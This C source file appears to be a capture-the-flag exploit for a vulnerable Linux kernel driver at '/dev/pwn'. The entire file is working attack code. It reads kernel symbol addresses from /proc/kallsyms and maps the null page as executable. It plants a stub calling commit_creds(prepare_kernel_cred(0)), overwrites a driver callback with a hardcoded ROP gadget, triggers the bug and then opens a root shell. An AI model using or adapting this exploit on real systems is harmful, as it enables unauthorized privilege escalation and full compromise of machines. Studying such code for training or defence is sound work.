#include <stdio.h>
#include <fcntl.h>
#include <stdlib.h>
#include <string.h>

#include <sys/types.h>
#include <sys/stat.h>
#include <sys/mman.h>

#define FLAG_LOCATION 0x01
#define ADD_DISALLOW_FILTER 0x02
#define ADD_CALLBACK_FILTER 0x03
#define MODIFY_CALLBACK 0x04
#define EMULATE_PACKET 0x05

#define DEVICE_NAME "/dev/pwn"

typedef struct disallow_filter {
    unsigned int pr_num;
    unsigned int port;
    unsigned int id;
    struct disallow_filter * next;
    struct disallow_filter * prev;
}disallow_filter;

typedef struct callback_filter {
    unsigned int pr_num;
    unsigned int id;

    void (*callback)(struct callback_filter *);
    struct callback_filter * next;
    struct callback_filter * prev;
}callback_filter;


struct cred;
struct task_struct;

/* Definitions for commit_creds and prepare_kernel_cred */
typedef struct cred *(*prepare_kernel_cred_t)(struct task_struct *daemon)
  __attribute__((regparm(3)));

typedef int (*commit_creds_t)(struct cred *new)
  __attribute__((regparm(3)));

prepare_kernel_cred_t prepare_kernel_cred;
commit_creds_t commit_creds;

/*
* Get the kernel addresses of symbols
*/
void *get_ksym(char *name) {
    FILE *f = fopen("/proc/kallsyms", "rb");
    char c, sym[512];
    void *addr;   
    int ret;

    while(fscanf(f, "%p %c %s\n", &addr, &c, sym) > 0)
        if (strcmp(sym, name) == 0)
        {
            printf("[+] Found address of %s at %p [+]\n", name, addr);
            return addr;
        }   
    return NULL;
}

void get_root()
{
        commit_creds(prepare_kernel_cred(0));
}


void stub()
{
        asm("call *%0" : : "r"(get_root));
	asm("pop %edi"); //because of our rop gadget, we need to pop once more
			 //this allows us to return properly to emulate_packet
}


int main()
{
	char buff[512];
	memset(buff, 0x00, sizeof(buff));

	/* get the addresses of the functions we need */
        commit_creds = get_ksym("commit_creds");
        prepare_kernel_cred = get_ksym("prepare_kernel_cred");

        if(!commit_creds || !prepare_kernel_cred)
        {
                printf("[x] Error getting addresses from kallsyms, exiting... [x]\n");
                return -1;
        }


	long *null_page = (long *) mmap(0, 4096, PROT_READ|PROT_WRITE|PROT_EXEC,
		MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, 0,0);

	if(null_page < 0)
	{
		printf("[x] Error mapping null page [x]\n");
		return -1;
	}

	void **fn = 0x46; //edx == 0x46 when called

	printf("[+] Mapped Null page [+]\n");

	/* Copy our asm stub into the mapped page at offset 0x46 */
	memcpy(fn, stub, 128);

	/* Create the callback filter that will be modified */
	callback_filter *my_cb_filter = (callback_filter *)\
				malloc(sizeof(callback_filter));

	my_cb_filter->pr_num = 0x13;
	my_cb_filter->id = 1337;

	int device = open(DEVICE_NAME, O_WRONLY);

	if(device < 0)
	{
		printf("[x] Unable to open device [x]\n");
		return -1;
	}

	printf("[+] Device opened [+]\n");

	buff[0] = ADD_CALLBACK_FILTER;
	memcpy(buff+1, my_cb_filter, sizeof(callback_filter));

	write(device, buff, strlen(buff));

	buff[0] = MODIFY_CALLBACK;

	/* Here we set the callback to a gadget that calls edx */
	/* EDX has a predictable value that can be mapped to */
	void *addr = (void *)0xc12f728a; //xor ebx,ebx; call edx
	void *id = (void *)0x00000539;

	printf("[+] modified callback address to call %p [+]\n", addr);

	memcpy(buff+4, &id, 4);
	memcpy(buff+4+4, &addr, 4);

	write(device, buff, strlen(buff));

	buff[0] = EMULATE_PACKET;
	buff[1] = 0x13;

	printf("[+] Triggering vulnerable code path [+]\n");

	write(device, buff, strlen(buff));

	close(device);

	if(getuid() == 0)
	{
		printf("[!!!] Enjoy your root shell [!!!]\n");
		system("/bin/sh");
		return 0;
	}
	else
	{
		printf("[x] Couldn't escalate privs [x]\n");
		return -1;
	}
}

